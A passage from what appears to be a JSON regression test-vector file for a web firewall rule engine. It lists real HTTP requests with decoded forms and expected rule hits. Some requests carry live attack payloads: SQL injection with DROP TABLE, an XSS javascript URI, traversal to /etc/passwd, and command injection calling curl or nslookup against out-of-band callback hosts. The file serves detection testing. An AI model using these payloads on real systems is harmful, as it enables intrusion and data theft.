@@ -1,0 +1,2243 @@
+{
+ "schema": 1,
+ "generated_at": 1792394596919,
+ "generator": "python/export_rules_testvec.py",
+ "ruleset_path": "artifacts/rules_selftest.json",
+ "ruleset_sha1_16": "c29f1eda0e47093e",
+ "ruleset_id": "selftest-ruleset",
+ "n_rules": 30,
+ "n_cases": 77,
+ "n_cases_with_hits": 26,
+ "n_cases_block": 1,
+ "min_weight_to_block": 1.0,
+ "decode": [
+  "urlencoded",
+  "unicode"
+ ],
+ "why": "两侧同源回归向量：Rust 门禁在没有 Python 的情况下重放它，钉死解码（含双重编码 / \\uXXXX / 代理对 / 孤立代理 / 非法转义）、作用域字段归属、加权记分、**只有 block 规则消耗阻断预算**、阻断线，以及二进制的自写 SHA-1。",
+ "notes": [
+  "匹配发生在**解码后**文本上；`full` = `METHOD path?query body`（`?` 字面量恒在）。",
+  "参考实现用「先拼装再整体解码」，Rust 用「逐段解码再拼装」—— 本向量即二者等价的证据。",
+  "裸 `$` 在 Python 里能匹配末尾换行之前、在 Rust 里不能；参考实现把裸 `$` 翻译成 `\\Z` 以对齐 Rust。",
+  "`weight` = 全部命中（证据）；`block_weight` = 仅 action=block 的命中（阻断预算）。"
+ ],
+ "cases": [
+  {
+   "id": "real-csic_anom-0",
+   "why": "真实池 csic_anom 的第 0 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/publico/anadir.jsp",
+    "query": "id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/publico/anadir.jsp?id=2&nombre=Jam�n Ib�rico&precio=85&cantidad='; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%&B1=A�adir al carrito ",
+    "path": "/tienda1/publico/anadir.jsp",
+    "query": "id=2&nombre=Jam�n Ib�rico&precio=85&cantidad='; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%&B1=A�adir al carrito",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_query_scope",
+    "sql_ddl_dml"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_query_scope",
+     "scope": "query",
+     "expect_field": "query"
+    },
+    {
+     "rule": "sql_ddl_dml",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 2.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_anom-1",
+   "why": "真实池 csic_anom 的第 1 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/publico/autenticar.jsp",
+    "query": "modo=entrar&login=theadora&pwd=4%F1adi3ie8to&remember=on&B1A=Entrar",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/publico/autenticar.jsp?modo=entrar&login=theadora&pwd=4�adi3ie8to&remember=on&B1A=Entrar ",
+    "path": "/tienda1/publico/autenticar.jsp",
+    "query": "modo=entrar&login=theadora&pwd=4�adi3ie8to&remember=on&B1A=Entrar",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_anom-2",
+   "why": "真实池 csic_anom 的第 2 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/publico/registro.jsp",
+    "query": "modo=registro&login=swick&password=recalzar&nombre=Amiel&apellidos=Del+Blanco&email=ying-carridine%40audiosat.sy&dni=55739537A&direccion=Jose+Cadierno+186%2C+6F&ciudad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&cp=37621&provincia=Asturias&ntc=2320151892972616&B1=Registrar",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/publico/registro.jsp?modo=registro&login=swick&password=recalzar&nombre=Amiel&apellidos=Del Blanco&email=ying-carridine@audiosat.sy&dni=55739537A&direccion=Jose Cadierno 186, 6F&ciudad='; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%&cp=37621&provincia=Asturias&ntc=2320151892972616&B1=Registrar ",
+    "path": "/tienda1/publico/registro.jsp",
+    "query": "modo=registro&login=swick&password=recalzar&nombre=Amiel&apellidos=Del Blanco&email=ying-carridine@audiosat.sy&dni=55739537A&direccion=Jose Cadierno 186, 6F&ciudad='; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%&cp=37621&provincia=Asturias&ntc=2320151892972616&B1=Registrar",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_query_scope",
+    "sql_ddl_dml"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_query_scope",
+     "scope": "query",
+     "expect_field": "query"
+    },
+    {
+     "rule": "sql_ddl_dml",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 2.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_anom-3",
+   "why": "真实池 csic_anom 的第 3 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/miembros/imagenes/zarauz.jpg/6909030637832563290.jsp",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/miembros/imagenes/zarauz.jpg/6909030637832563290.jsp? ",
+    "path": "/tienda1/miembros/imagenes/zarauz.jpg/6909030637832563290.jsp",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_anom-4",
+   "why": "真实池 csic_anom 的第 4 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "POST",
+    "path": "/tienda1/publico/registro.jsp",
+    "query": "",
+    "body": "modo=registro&login=draves&password=ro%F1IcA&nombre=Babeli&apellidos=Hermoso+Ginart&email=haver0%40iurispretor.cn&dni=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&direccion=Calle+Urbina%2C+129+&ciudad=Berango&cp=33775&provincia=Le%F3n&ntc=7007903703917778&B1=Registrar",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "POST /tienda1/publico/registro.jsp? modo=registro&login=draves&password=ro�IcA&nombre=Babeli&apellidos=Hermoso Ginart&email=haver0@iurispretor.cn&dni=paros\" style=\"background:url(javascript:alert('Paros'))&direccion=Calle Urbina, 129 &ciudad=Berango&cp=33775&provincia=Le�n&ntc=7007903703917778&B1=Registrar",
+    "path": "/tienda1/publico/registro.jsp",
+    "query": "",
+    "body": "modo=registro&login=draves&password=ro�IcA&nombre=Babeli&apellidos=Hermoso Ginart&email=haver0@iurispretor.cn&dni=paros\" style=\"background:url(javascript:alert('Paros'))&direccion=Calle Urbina, 129 &ciudad=Berango&cp=33775&provincia=Le�n&ntc=7007903703917778&B1=Registrar",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [
+    "xss_js_uri"
+   ],
+   "hit_detail": [
+    {
+     "rule": "xss_js_uri",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_anom-5",
+   "why": "真实池 csic_anom 的第 5 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/miembros/editar.jsp",
+    "query": "modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim%E9nez+Alamo&email=gleaves4%40mauroman.ml&dni=93721450S&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/miembros/editar.jsp?modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim�nez Alamo&email=gleaves4@mauroman.ml&dni=93721450S&direccion=Escritor Gomez De Rivera, 191 &ciudad=Legutiano&cp=09119&provincia=C�ceres&ntc=9325877908605374&B1=Registrar<!--#include file=\"archivo_secreto\" --> ",
+    "path": "/tienda1/miembros/editar.jsp",
+    "query": "modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim�nez Alamo&email=gleaves4@mauroman.ml&dni=93721450S&direccion=Escritor Gomez De Rivera, 191 &ciudad=Legutiano&cp=09119&provincia=C�ceres&ntc=9325877908605374&B1=Registrar<!--#include file=\"archivo_secreto\" -->",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_holdout-0",
+   "why": "真实池 csic_norm_holdout 的第 0 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "POST",
+    "path": "/tienda1/publico/caracteristicas.jsp",
+    "query": "",
+    "body": "id=2",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "POST /tienda1/publico/caracteristicas.jsp? id=2",
+    "path": "/tienda1/publico/caracteristicas.jsp",
+    "query": "",
+    "body": "id=2",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_holdout-1",
+   "why": "真实池 csic_norm_holdout 的第 1 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "POST",
+    "path": "/tienda1/publico/pagar.jsp",
+    "query": "",
+    "body": "modo=insertar&precio=9740&B1=Confirmar",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "POST /tienda1/publico/pagar.jsp? modo=insertar&precio=9740&B1=Confirmar",
+    "path": "/tienda1/publico/pagar.jsp",
+    "query": "",
+    "body": "modo=insertar&precio=9740&B1=Confirmar",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_holdout-2",
+   "why": "真实池 csic_norm_holdout 的第 2 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/publico/entrar.jsp",
+    "query": "errorMsg=Credenciales+incorrectas",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/publico/entrar.jsp?errorMsg=Credenciales incorrectas ",
+    "path": "/tienda1/publico/entrar.jsp",
+    "query": "errorMsg=Credenciales incorrectas",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_holdout-3",
+   "why": "真实池 csic_norm_holdout 的第 3 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/publico/vaciar.jsp",
+    "query": "B2=Vaciar+carrito",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/publico/vaciar.jsp?B2=Vaciar carrito ",
+    "path": "/tienda1/publico/vaciar.jsp",
+    "query": "B2=Vaciar carrito",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_holdout-4",
+   "why": "真实池 csic_norm_holdout 的第 4 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "POST",
+    "path": "/tienda1/publico/anadir.jsp",
+    "query": "",
+    "body": "id=3&nombre=Vino+Rioja&precio=85&cantidad=11&B1=A%F1adir+al+carrito",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "POST /tienda1/publico/anadir.jsp? id=3&nombre=Vino Rioja&precio=85&cantidad=11&B1=A�adir al carrito",
+    "path": "/tienda1/publico/anadir.jsp",
+    "query": "",
+    "body": "id=3&nombre=Vino Rioja&precio=85&cantidad=11&B1=A�adir al carrito",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_holdout-5",
+   "why": "真实池 csic_norm_holdout 的第 5 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/publico/vaciar.jsp",
+    "query": "B2=Vaciar+carrito",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/publico/vaciar.jsp?B2=Vaciar carrito ",
+    "path": "/tienda1/publico/vaciar.jsp",
+    "query": "B2=Vaciar carrito",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_rest-0",
+   "why": "真实池 csic_norm_rest 的第 0 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/index.jsp",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/index.jsp? ",
+    "path": "/tienda1/index.jsp",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_rest-1",
+   "why": "真实池 csic_norm_rest 的第 1 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "POST",
+    "path": "/tienda1/publico/autenticar.jsp",
+    "query": "",
+    "body": "modo=entrar&login=llaguno&pwd=cabrea_r&remember=off&B1=Entrar",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "POST /tienda1/publico/autenticar.jsp? modo=entrar&login=llaguno&pwd=cabrea_r&remember=off&B1=Entrar",
+    "path": "/tienda1/publico/autenticar.jsp",
+    "query": "",
+    "body": "modo=entrar&login=llaguno&pwd=cabrea_r&remember=off&B1=Entrar",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_rest-2",
+   "why": "真实池 csic_norm_rest 的第 2 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "POST",
+    "path": "/tienda1/publico/entrar.jsp",
+    "query": "",
+    "body": "errorMsg=Credenciales+incorrectas",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "POST /tienda1/publico/entrar.jsp? errorMsg=Credenciales incorrectas",
+    "path": "/tienda1/publico/entrar.jsp",
+    "query": "",
+    "body": "errorMsg=Credenciales incorrectas",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_rest-3",
+   "why": "真实池 csic_norm_rest 的第 3 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/publico/caracteristicas.jsp",
+    "query": "id=1",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/publico/caracteristicas.jsp?id=1 ",
+    "path": "/tienda1/publico/caracteristicas.jsp",
+    "query": "id=1",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_rest-4",
+   "why": "真实池 csic_norm_rest 的第 4 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/imagenes/2.gif",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/imagenes/2.gif? ",
+    "path": "/tienda1/imagenes/2.gif",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-csic_norm_rest-5",
+   "why": "真实池 csic_norm_rest 的第 5 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/tienda1/global/creditos.jsp",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /tienda1/global/creditos.jsp? ",
+    "path": "/tienda1/global/creditos.jsp",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-datacon_atk-0",
+   "why": "真实池 datacon_atk 的第 0 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "POST",
+    "path": "/",
+    "query": "g=app_av_import_save",
+    "body": "------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"uljkbgco.txt\"\r\nContent-Type: text/plain\r\n\r\neszlppapplfouqxtjhtjhnwwhwguvhpu\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"__hash__\"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryfmaxcaor--",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "POST /?g=app_av_import_save ------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"uljkbgco.txt\"\r\nContent-Type: text/plain\r\n\r\neszlppapplfouqxtjhtjhnwwhwguvhpu\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"__hash__\"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryfmaxcaor--",
+    "path": "/",
+    "query": "g=app_av_import_save",
+    "body": "------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"uljkbgco.txt\"\r\nContent-Type: text/plain\r\n\r\neszlppapplfouqxtjhtjhnwwhwguvhpu\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryfmaxcaor\r\nContent-Disposition: form-data; name=\"__hash__\"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryfmaxcaor--",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
+    "referer": ""
+   },
+   "hits": [
+    "sqli_comment_tail"
+   ],
+   "hit_detail": [
+    {
+     "rule": "sqli_comment_tail",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-datacon_atk-1",
+   "why": "真实池 datacon_atk 的第 1 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/pmb/opac_css/getgif.php",
+    "query": "chemin=../../../../../../etc/passwd&nomgif=u7b8",
+    "body": "",
+    "ua": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=u7b8 ",
+    "path": "/pmb/opac_css/getgif.php",
+    "query": "chemin=../../../../../../etc/passwd&nomgif=u7b8",
+    "body": "",
+    "ua": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "referer": ""
+   },
+   "hits": [
+    "path_sensitive_file",
+    "path_traversal"
+   ],
+   "hit_detail": [
+    {
+     "rule": "path_sensitive_file",
+     "scope": "full",
+     "expect_field": null
+    },
+    {
+     "rule": "path_traversal",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 2.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-datacon_atk-2",
+   "why": "真实池 datacon_atk 的第 2 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20ctrf45n5hmeh23etvt60q54ptj3pbes9a.oast.live",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/v1/totp/user-backup-code/../../license/keys-status/;curl ctrf45n5hmeh23etvt60q54ptj3pbes9a.oast.live? ",
+    "path": "/api/v1/totp/user-backup-code/../../license/keys-status/;curl ctrf45n5hmeh23etvt60q54ptj3pbes9a.oast.live",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "referer": ""
+   },
+   "hits": [
+    "cmd_shell_bin",
+    "path_traversal"
+   ],
+   "hit_detail": [
+    {
+     "rule": "cmd_shell_bin",
+     "scope": "full",
+     "expect_field": null
+    },
+    {
+     "rule": "path_traversal",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 2.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-datacon_atk-3",
+   "why": "真实池 datacon_atk 的第 3 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20ct7gdmu785gl202fkf5gr7r18ieotgdbb.oast.fun%22%29%7D/",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.140 [ip:151.47.113.45]",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /${@java.lang.Runtime@getRuntime().exec(\"nslookup ct7gdmu785gl202fkf5gr7r18ieotgdbb.oast.fun\")}/? ",
+    "path": "/${@java.lang.Runtime@getRuntime().exec(\"nslookup ct7gdmu785gl202fkf5gr7r18ieotgdbb.oast.fun\")}/",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.140 [ip:151.47.113.45]",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-datacon_atk-4",
+   "why": "真实池 datacon_atk 的第 4 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "POST",
+    "path": "/",
+    "query": "",
+    "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<config-auth client=\"vpn\" type=\"auth-reply\" aggregate-auth-version=\"2\"><version who=\"vpn\">5.0.01242</version><device-id computer-name=\"DESKTOP-0000000\" device-type=\"Dell Inc. 000000000000000\" platform-version=\"10.0.19045 \" unique-id=\"0000000000000000000000000000000000000000000000000000000000000000\" unique-id-global=\"0000000000000000000000000000000000000000\">win</device-id>\n<mac-address-list>\n<mac-address>00-00-00-00-00-00</mac-address></mac-address-list>\n<session-token></session-token>\n<session-id></session-id>\n<opaque is-for=\"sg\">\n<tunnel-group>DefaultRAGroup</tunnel-group>\n<auth-method>multiple-cert</auth-method>\n<auth-method>single-sign-on</auth-method>\n<auth-method>single-sign-on-v2</auth-method>\n<group-alias>DefaultRAGroup</group-alias>\n<config-hash>1709462944829</config-hash></opaque>\n<auth>\n<password>Server2010</password>\n<username>test</username></auth>\n<group-select>DefaultRAGroup</group-select>\n</config-auth>",
+    "ua": "AnyConnect Windows 5.0.01242",
+    "referer": ""
+   },
+   "decoded": {
